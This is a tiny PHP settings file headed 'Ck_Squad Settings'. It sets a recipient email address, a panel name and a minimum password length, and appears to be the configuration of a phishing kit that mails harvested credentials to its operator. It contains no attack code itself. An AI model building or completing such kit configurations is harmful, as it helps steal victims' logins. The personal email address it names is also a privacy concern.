<?php
/* [$$$-------------- Ck_Squad Settings --------------$$$] */
$ck_squad_email = 'kiiaraayden@yahoo.com';
$ck_squad_panel = 'ck';
$ck_squad_minpass = '7';
?>